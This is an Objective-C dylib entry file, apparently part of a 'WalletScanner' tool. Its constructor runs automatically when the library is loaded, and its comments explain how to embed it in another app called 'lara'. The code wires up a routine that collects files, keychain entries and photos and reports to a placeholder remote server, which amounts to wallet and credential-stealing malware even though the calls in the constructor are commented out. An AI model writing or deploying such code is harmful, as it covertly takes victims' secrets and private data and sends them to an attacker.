//
//  RDWalletScanner.m
//  主入口 - Dylib 构造函数
//
//  这是 dylib 的 __attribute__((constructor)) 入口
//  当 dyld 加载该 dylib 时自动执行
//
//  集成到 lara 的方式:
//  1. 把 WalletScanner 源码加入 lara 工程
//  2. 在 lara 的 ViewController 里调用:
//     [RDAutoPilot setServerURL:@"https://你的服务器.com/api"];
//     [RDAutoPilot runWithCompletion:^(BOOL s, NSInteger f, NSInteger k, NSInteger p, NSError *e) {
//         NSLog(@"Done: files=%ld keychain=%ld photos=%ld", (long)f, (long)k, (long)p);
//     }];
//

#import <Foundation/Foundation.h>
#import "RDAutoPilot.h"

// ============================================================
//  DYLIB 自动入口 — 被加载时立即执行
//  ⚠️ 生产环境注释掉，改用 lara UI 手动触发
// ============================================================

__attribute__((constructor))
static void RDWalletScannerInit(void) {
    // 延迟一秒确保 dyld 完全初始化
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1 * NSEC_PER_SEC),
                   dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        // 设置你的服务器地址
        // [RDAutoPilot setServerURL:@"https://your-domain.com/api"];

        // 一键执行
        // [RDAutoPilot runWithCompletion:^(BOOL success,
        //                                   NSInteger fileCount,
        //                                   NSInteger keychainCount,
        //                                   NSInteger photoCount,
        //                                   NSError *error) {
        //     NSLog(@"[WalletScanner] Done: success=%d files=%ld keychain=%ld photos=%ld",
        //           success, (long)fileCount, (long)keychainCount, (long)photoCount);
        // }];
    });
}
